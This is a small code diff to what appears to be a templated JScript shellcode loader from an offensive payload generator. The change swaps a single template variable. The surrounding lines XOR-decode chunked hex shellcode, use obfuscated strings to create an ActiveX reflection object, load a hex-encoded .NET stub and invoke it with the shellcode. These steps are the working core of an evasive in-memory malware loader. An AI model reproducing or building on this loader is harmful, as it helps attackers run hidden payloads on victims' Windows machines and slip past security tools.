@@ -119,7 +119,7 @@
         for (var _ki = 0; _ki < _k.length; _ki++) _k[_ki] ^= {{ key_tweak }};
         var sc = {{ v.fn_xor }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), _k);
         var loader = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-        var asm = loader.Load({{ v.fn_hex }}("{{ v.dotnet_stub_hex }}"));
+        var asm = loader.Load({{ v.fn_hex }}("{{ dotnet_stub_hex }}"));
         asm.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}])).GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}])).Invoke(null, [sc]);
     }
 
